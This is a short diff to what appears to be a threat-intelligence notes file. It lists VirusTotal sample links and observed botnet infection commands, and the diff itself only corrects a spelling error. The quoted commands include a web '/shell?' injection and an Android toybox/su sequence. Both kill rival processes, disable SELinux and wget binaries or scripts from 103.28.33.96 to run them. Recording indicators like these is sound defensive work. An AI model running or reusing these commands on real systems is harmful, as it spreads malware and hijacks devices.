@@ -22,7 +22,7 @@ https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46
 d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
 https://www.virustotal.com/gui/file/d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
 
-Malcious Commands seen:
+Malicious Commands seen:
 /shell?pidof+arm7+|+grep+arm7+|+xargs+kill+-9;ps+arm+|+xargs+kill+-9;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.28.33.96/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;wget+http:/\\/103.28.33.96/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;rm+-rf+most*
 
 toybox top -b -n 1 | awk '$9 > 20 {print $1}' | toybox xargs kill -9;toybox top -b -n 1 | awk '$9 > 20 {print $1}' | su 0 toybox xargs kill -9;toybox pkill -9 M;toybox pkill -9 arm;toybox pkill -9 arm7;toybox pkill -9 x86;toybox pkill -9 x86_64;su 0 toybox pkill -9 arm;su 0 toybox pkill -9 arm7;su 0 toybox pkill -9 x86;su 0 toybox pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;setenforce 0;busybox wget http://103.28.33.96/and || su 0 busybox wget http://103.28.33.96/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
